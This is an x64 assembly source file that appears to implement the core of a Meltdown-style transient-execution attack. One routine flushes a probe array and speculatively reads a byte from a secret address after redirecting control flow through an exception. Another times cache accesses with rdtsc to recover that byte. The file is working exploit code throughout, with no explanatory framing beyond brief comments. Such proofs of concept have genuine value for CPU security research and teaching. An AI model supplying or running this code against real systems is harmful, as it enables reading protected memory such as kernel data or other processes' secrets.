.code
; by Li Mo
; phylimo@163.com

EXTRN probeArray: QWORD
EXTRN timings:    QWORD
EXTRN raise_exp_f: QWORD
EXTRN secret: QWORD

_read_time PROC PUBLIC
	;this is proc read time as the side channel for secret content
		push rbx
		push rdi
		push r10
		push r11
		push r12
		push r13

		mov r12, ((1000h * 100h) / 40h / 40h)
		mov rdi, probeArray
		mov r13, timings

_read_timing_loop:
        mfence
        lfence
        rdtsc
        lfence
        mov r10, rax
        mov rbx, qword ptr [rdi] ; read from cacheline in probearray
        lfence
        rdtsc
        mov r11, rax
        sub r11, r10 ; r11 holds access time

        ; store timing in timings table (r13)
        mov qword ptr [r13], r11
        add r13, 08h

        add rdi, (40h * 40h) ; increment rdi by 0x40 cachelines
        dec r12
        jnz _read_timing_loop

		pop r13
		pop r12
		pop r11
		pop r10
		pop rdi
		pop rbx
		ret

_read_time ENDP


; rcx - secret addr to read
_my_leak PROC PUBLIC
    ; save nonvolatile registers
    push rbx
    push rbp
    push rdi
    push rsi
    push rsp
    push r12
    push r13
    push r14
    push r15

    ; allocate stackspace including 32byte shadowstack
    mov rbp, rsp
    sub rsp, 20h


	;invalid the secret string cache.
	mov rax, secret
	add rax, 1000h * 250
	clflush [rax]    

	mfence

	; invalidate probeArray
	mov rax, probeArray
	mov r9,  ((1000h * 100h) / 40h) ; 0x100000 byte divided by cacheline size (64byte)
	_cache_invalidate_loop:
		; invalidate cacheline
		clflush [rax]
		add rax, 40h
		dec r9
		jnz _cache_invalidate_loop

	mfence
	mov rbx, probeArray ; probe array base speculative execution
	
	mov r11, rcx
	mov r14, raise_exp_f
	xor rax, rax ; clear rax
	call r14  ;  the execution flow is redirected here. 

	;NOTE: 
	; The following codes will never be executed "explicitly" because the function raise_exp redirects the execution flow.
	; However, the codes may be executed "implicitly" within CPU due to the out-of-order execution mechanism. And this impliclit execution causes some change in CPU cache.

    mov al,  byte ptr [r11] ; speculative invalid access
	and rax, 00ffh
    shl rax, 0ch
    mov r11, qword ptr [rbx + rax] ; access cacheline in probeArray. side channel.

    ; restore nonvolatile registers and tear down stackframe
    add rsp, 20h

    pop r15
    pop r14
    pop r13
    pop r12
    pop rsp
    pop rsi
    pop rdi
    pop rbp
    pop rbx
    ret
_my_leak ENDP

END